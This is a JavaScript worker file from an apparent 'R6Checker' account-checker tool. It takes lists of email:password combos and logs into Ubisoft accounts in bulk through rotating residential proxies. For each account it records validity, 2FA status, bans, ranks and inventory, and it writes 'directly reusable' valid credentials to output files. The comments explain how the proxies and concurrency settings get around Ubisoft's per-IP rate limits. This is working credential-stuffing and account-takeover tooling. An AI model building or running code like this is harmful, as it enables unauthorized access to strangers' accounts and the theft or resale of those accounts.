'use strict';
// Worker thread — runs ONE account through the same checkOne pipeline the
// server's bulk runner uses, so the desktop checker produces IDENTICAL result
// lines (rank-per-platform, ranked charms / weapon skins, stats.cc last-played,
// Ubisoft sanctions, ghost-account filtering, …).
//
// What's different vs. the server:
//   • TRACKER.GG is disabled — cycletls spawns a Go subprocess and can't be
//     packaged into a SEA exe. Ban detection therefore relies on Ubisoft's
//     `currentSanctions` + stats.cc's `is_cheating_banned`. R6_NO_TRACKER=1
//     is set BEFORE rankSources loads to make every tracker.gg path a no-op.
//   • All disk caches go under %LOCALAPPDATA%\R6Checker\.cache (writable in SEA).
//   • Tabstats / r6tab fallbacks (third-party rank trackers) still work — only
//     tracker.gg is muted.

const { parentPort, workerData } = require('worker_threads');
const path = require('path');
const os = require('os');
const fs = require('fs');

// ── ENV SHIMS — must happen BEFORE requiring any lib/* module ──────────────
// CACHE_DIR: lib/player + lib/linkedHistory + lib/ubisoftItems + lib/r6dataCache
// all honour this. Without it they'd try to write next to __dirname (= the SEA
// bundle's path, read-only).
const APPDATA_BASE = process.env.LOCALAPPDATA || process.env.APPDATA || os.homedir();
const CACHE_ROOT = process.env.R6_CACHE_DIR || path.join(APPDATA_BASE, 'R6Checker', '.cache');
try { fs.mkdirSync(CACHE_ROOT, { recursive: true }); } catch {}
process.env.CACHE_DIR = CACHE_ROOT;

// Disable every tracker.gg code path (it requires cycletls + a Go subprocess).
process.env.R6_NO_TRACKER = '1';
process.env.TRACKER_BAN_CHECK = '0';
// stats.cc is the desktop ban + rank backstop — must stay enabled.
process.env.STATSCC_CHECK = process.env.STATSCC_CHECK || '1';
process.env.BULK_BAN_RECHECKS = process.env.BULK_BAN_RECHECKS || '4';
process.env.ENRICH_SRC_CAP_MS = process.env.ENRICH_SRC_CAP_MS || '8000';

// Profile links in result lines (lib/checker/resultFormat) default SITE_URL to
// http://localhost:3000 — useless on a user's machine. Point them at the public
// site so "Profile: …" is a real, clickable r6checker.xyz link. Derive from the
// configured server URL (R6_SERVER_URL) when set, else the public default.
process.env.SITE_URL = process.env.SITE_URL
  || (process.env.R6_SERVER_URL || '').replace(/\/+$/, '')
  || 'https://r6checker.xyz';

// CRITICAL FIX: route the AUTHENTICATED Ubisoft enrichment (level, items,
// credits, renown, ranks, inventory — lib/api ubiRequest) through the user's
// BYO proxy. Without this those calls go DIRECT from the user's home IP, get
// rate-limited at high concurrency, and come back EMPTY (Lvl 0 / Items 0 / …).
// With a rotating-residential proxy each call exits a fresh IP, so per-IP limits
// don't apply — let the enrichment fan out to keep pace with the check rate.
if (workerData && workerData.enrichProxy) {
  process.env.UBI_PROXY_URL = workerData.enrichProxy;
  // Each call exits a FRESH rotating IP, so Ubisoft's per-IP rate limit doesn't
  // apply — open the per-worker enrichment throttle wide so valids enrich fast.
  process.env.UBI_CONCURRENCY = process.env.UBI_CONCURRENCY || '64';
  process.env.UBI_RPS         = process.env.UBI_RPS         || '250';
  // Give enrichment enough time to return real inventory/ranks — the old 8s cap
  // produced hollow Lvl:0/Items:0 valids at high concurrency.
  process.env.UBI_TIMEOUT     = process.env.UBI_TIMEOUT     || '14000';
  process.env.UBI_RETRIES     = process.env.UBI_RETRIES     || '3';
}

// Workers communicate ONLY via postMessage — anything they print to stdout/stderr
// (lib/auth's "[auth] login attempt N → HTTP 429" retry lines, lib/player's
// "[player] …" diagnostics) bleeds straight into the clean menu UI and spams it.
// Silence the noisy levels; keep console.error for genuine crashes. Set
// R6_WORKER_VERBOSE=1 to restore full worker logging when debugging.
if (process.env.R6_WORKER_VERBOSE !== '1') {
  const noop = () => {};
  // Silence console.ERROR too: lib/api logs every failed Ubisoft call via
  // console.error with a giant multi-KB itemIds URL. Synchronous stderr writes
  // block the worker's event loop → throughput craters the instant a valid hits
  // enrichment. The worker reports real failures via postMessage anyway.
  console.log = noop; console.info = noop; console.warn = noop; console.debug = noop; console.error = noop;
}

// Per-worker proxy (passed in from the pool, ROUND-ROBIN'd over proxies.txt).
const REQ_TIMEOUT = workerData.requestTimeoutMs || 20000;
const ENRICH      = workerData.enrich !== false;
const FAST_PASS   = workerData.fastPass === true || process.env.R6_FAST_PASS === '1';
const SWEEP_ONLY  = workerData.sweepOnly === true || process.env.R6_SWEEP_ONLY === '1';
const ENRICH_ONLY = workerData.enrichOnly === true || process.env.R6_ENRICH_ONLY === '1';

// ── Server pipeline imports (esbuild inlines these into worker.bundle.js) ──
const { login, check2FA, freshProxy } = require('../../lib/auth');
const { getPlayerData }   = require('../../lib/player');
const fmt                 = require('../../lib/checker/resultFormat');
const BRAND               = require('./brand');

// Lite (Ubisoft VM) build skips the whole getPlayerData enrichment pipeline —
// it only validates the login (sessions) and checks for a ban. These are used
// only on that path.
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const CROSSPLAY_SPACE = '0d2ae42d-4c27-4cb7-af6c-2099062302bb';

function withTimeout(promise, ms, tag) {
  return new Promise((resolve, reject) => {
    const t = setTimeout(() => reject(new Error(tag || 'timeout')), ms);
    promise.then((v) => { clearTimeout(t); resolve(v); }, (e) => { clearTimeout(t); reject(e); });
  });
}

// Authenticated header set for the sanctions (ban) lookup.
function authHeaders(session) {
  return {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:151.0) Gecko/20100101 Firefox/151.0',
    'Ubi-AppId': session.appId,
    'Ubi-SessionId': session.sessionId || '',
    'Authorization': `Ubi_v1 t=${session.ticket}`,
    'Accept': 'application/json',
    'Content-Type': 'application/json',
  };
}

// Current-ban check via Ubisoft sanctions (currentSanctions). Best-effort:
// returns false (not banned) on any error so a network hiccup never mislabels a
// good account as banned. Routes through the per-job proxy (fresh session IP).
async function banCheck(session, proxyUrl) {
  try {
    const agent = proxyUrl ? new HttpsProxyAgent(freshProxy(proxyUrl)) : undefined;
    const id = encodeURIComponent(session.userId);
    const res = await axios({
      method: 'get',
      url: `https://public-ubiservices.ubi.com/v1/profiles/${id}/sanctions?spaceId=${CROSSPLAY_SPACE}`,
      headers: authHeaders(session), httpsAgent: agent, proxy: false,
      timeout: REQ_TIMEOUT, validateStatus: () => true,
    });
    if (res.status >= 200 && res.status < 300) {
      const list = res.data && (res.data.currentSanctions || res.data.sanctions);
      if (Array.isArray(list)) return list.length > 0;
    }
  } catch { /* unknown → treat as not banned */ }
  return false;
}

// Ubisoft VM (lite): validate the login via the sessions endpoint and check for
// a ban — nothing else. No ranks, skins, items, or last-played. Outcome is one
// of invalid / twofa / retry / network / success(+banned/twoFactor).
async function liteCheck(email, password, proxyUrl) {
  if (!isPlausibleEmail(email)) return { outcome: 'invalid' };
  let session;
  try {
    session = await login(email, password, proxyUrl ? { proxyUrl } : {});
  } catch (loginError) {
    return { outcome: fmt.decideOutcome({ loginError }) };
  }
  // 2FA-enabled + ban checks run together (both only need the ticket).
  const [twoFactor, banned] = await Promise.all([
    withTimeout(check2FA(session.ticket, session.sessionId, proxyUrl ? { proxyUrl } : {}), 4000, '2fa').then(v => v, () => false),
    banCheck(session, proxyUrl),
  ]);
  return { outcome: 'success', banned: !!banned, twoFactor: !!twoFactor };
}

// Minimal result line for the lite build. Clean email:pass for valids (so
// valid.txt is directly reusable); tagged only where a tag is needed to
// distinguish the bucket.
function buildLite(item, r) {
  const { email, password } = item;
  if (r.outcome === 'invalid') return { status: 'invalid', line: `${email}:${password}` };
  if (r.outcome === 'twofa')   return { status: 'twofa',   line: `${email}:${password} | 2FA_REQUIRED` };
  if (r.outcome === 'retry')   return { status: 'error',   line: `${email}:${password} | ERROR_RETRY`,   error: 'rate-limit', code: 'ERATELIMIT' };
  if (r.outcome === 'network') return { status: 'error',   line: `${email}:${password} | ERROR_NETWORK`, error: 'network',    code: 'ENETWORK' };
  if (r.banned)    return { status: 'banned', line: `${email}:${password} | Banned: Y` };
  if (r.twoFactor) return { status: 'twofa',  line: `${email}:${password} | 2FA: Y` };
  return { status: 'valid', line: `${email}:${password}` };
}

function isPlausibleEmail(e) {
  return typeof e === 'string' && e.length <= 254 && /^[^@\s]+@[^@\s.]+(\.[^@\s.]+)+$/.test(e);
}

// Pass-1 fast sweep: login (+ quick 2FA probe) only — no getPlayerData.
// Used for huge lists so invalids finish at login speed; hits enrich in pass 2.
async function fastPassCheck(email, password, proxyUrl) {
  if (!isPlausibleEmail(email)) return { outcome: 'invalid' };
  let session;
  try {
    session = await login(email, password, proxyUrl ? { proxyUrl } : {});
  } catch (loginError) {
    return { outcome: fmt.decideOutcome({ loginError }) };
  }
  const twoFactor = await withTimeout(
    check2FA(session.ticket, session.sessionId, proxyUrl ? { proxyUrl } : {}),
    2500, '2fa timeout',
  ).then(v => v, () => false);
  const pd = {
    username: session.nameOnPlatform || '',
    userId: session.userId,
    twoFactor: !!twoFactor,
    banChecked: false,
  };
  return { outcome: 'success', playerData: pd };
}

// Mirror of lib/checker/bulkRunner.js → checkOne(). Kept in lock-step on
// purpose so the desktop output line === the server output line.
async function checkOne(email, password, proxyUrl) {
  if (!isPlausibleEmail(email)) return { outcome: 'invalid' };
  let session;
  try {
    session = await login(email, password, proxyUrl ? { proxyUrl } : {});
  } catch (loginError) {
    return { outcome: fmt.decideOutcome({ loginError }) };
  }
  // 2FA probe runs in parallel with the data fetch — both share the ticket.
  const twoFaP = withTimeout(
    check2FA(session.ticket, session.sessionId, proxyUrl ? { proxyUrl } : {}),
    4000, '2fa timeout'
  ).then(v => v, () => undefined);

  // Data fetch — retry transient hiccups. If we still can't fetch full data
  // after DATA_RETRIES, we bounce back to the OUTER retry loop instead of
  // emitting a partial (per user's "no partials, ever" directive). The pool's
  // slow-lane requeue will pick this up and retry again later until success.
  const DATA_RETRIES = Math.max(0, Number(process.env.BULK_DATA_RETRIES) || 5);
  let playerData = null;
  for (let i = 0; i <= DATA_RETRIES; i++) {
    try {
      playerData = await getPlayerData(session.userId, session.ticket, session.sessionId, session.appId, { bulk: true, forceRefresh: true });
      break;
    } catch (e) {
      if (i < DATA_RETRIES) { await new Promise(r => setTimeout(r, 300 + i * 400)); continue; }
    }
  }
  if (!playerData) return { outcome: 'retry' };   // bounce to outer requeue — NEVER a partial

  const twoFactor = await twoFaP;
  if (twoFactor !== undefined) playerData.twoFactor = twoFactor;
  if (!fmt.isCaptureComplete(playerData)) return { outcome: 'retry' };
  return { outcome: 'success', playerData };
}

// Map (outcome, playerData) → the {status, line} shape the runner consumes.
//   status one of: valid | banned | twofa | invalid | error
function buildResult(item, outcome, playerData) {
  const { email, password } = item;
  if (outcome === 'invalid') return { status: 'invalid', line: `${email}:${password}` };
  if (outcome === 'twofa')   return { status: 'twofa',   line: fmt.formatLine(email, password, 'twofa') };
  if (outcome === 'retry')   return { status: 'error',   line: `${email}:${password} | ERROR_RETRY`,   error: 'anti-bot / rate-limit', code: 'ERATELIMIT' };
  if (outcome === 'network') return { status: 'error',   line: `${email}:${password} | ERROR_NETWORK`, error: 'network',              code: 'ENETWORK' };
  // success → split by banned / twofa-enabled / unverified ban
  const line = fmt.formatLine(email, password, 'success', playerData);
  if (playerData?.banned)    return { status: 'banned', line };
  if (playerData?.banChecked === false) {
    return { status: 'error', line: `${email}:${password} | ERROR_RETRY`, error: 'ban unverified', code: 'EBANUNK' };
  }
  if (playerData?.twoFactor) return { status: 'twofa',  line };
  return { status: 'valid', line };
}

async function processJob(item, proxyUrl) {
  const started = Date.now();
  const { email, password } = item;

  // Ubisoft VM build: login-validate + ban only. Nothing else runs.
  if (BRAND.lite) {
    const r = await liteCheck(email, password, proxyUrl);
    const out = buildLite(item, r);
    return { id: item.id, ...out, latencyMs: Date.now() - started };
  }

  // Pipeline enrich lane — full capture (login + getPlayerData). Sweep already
  // proved the combo works; enrich re-logins with fresh IP for complete data.
  if (ENRICH_ONLY) {
    const { outcome, playerData } = await checkOne(email, password, proxyUrl);
    const out = buildResult(item, outcome, playerData);
    return { id: item.id, ...out, latencyMs: Date.now() - started };
  }

  // Pipeline sweep: login only — hits queue for inline full capture (no hollow writes).
  if (SWEEP_ONLY) {
    const { outcome } = await fastPassCheck(email, password, proxyUrl);
    if (outcome === 'invalid') {
      return { id: item.id, status: 'invalid', line: `${email}:${password}`, latencyMs: Date.now() - started };
    }
    if (outcome === 'retry') {
      return { id: item.id, status: 'error', line: `${email}:${password} | ERROR_RETRY`, error: 'rate-limit', code: 'ERATELIMIT', latencyMs: Date.now() - started };
    }
    if (outcome === 'network') {
      return { id: item.id, status: 'error', line: `${email}:${password} | ERROR_NETWORK`, error: 'network', code: 'ENETWORK', latencyMs: Date.now() - started };
    }
    return { id: item.id, needsEnrich: true, status: 'pending', latencyMs: Date.now() - started };
  }

  // Pass-1 fast sweep OR enrich-off (legacy): login (+2FA) only, no inventory/ranks/ban enrich.
  if (FAST_PASS || !ENRICH) {
    const { outcome, playerData } = await fastPassCheck(email, password, proxyUrl);
    const out = buildResult(item, outcome, playerData);
    return { id: item.id, ...out, latencyMs: Date.now() - started };
  }

  const { outcome, playerData } = await checkOne(email, password, proxyUrl);
  const out = buildResult(item, outcome, playerData);
  return { id: item.id, ...out, latencyMs: Date.now() - started };
}

// ── Worker message loop ────────────────────────────────────────────────────
parentPort.on('message', async (msg) => {
  if (!msg || msg.type !== 'job') {
    if (msg && msg.type === 'shutdown') process.exit(0);
    return;
  }
  try {
    const result = await processJob(msg.item, msg.proxy);
    parentPort.postMessage({ type: 'result', ...result, jobId: msg.item.id });
  } catch (err) {
    parentPort.postMessage({
      type: 'result', jobId: msg.item.id, id: msg.item.id,
      status: 'error', error: err.message || String(err), code: err.code || 'EUNKNOWN',
      line: `${msg.item.email}:${msg.item.password} | ERROR_NETWORK`,
      latencyMs: 0,
    });
  }
});

parentPort.postMessage({ type: 'ready' });
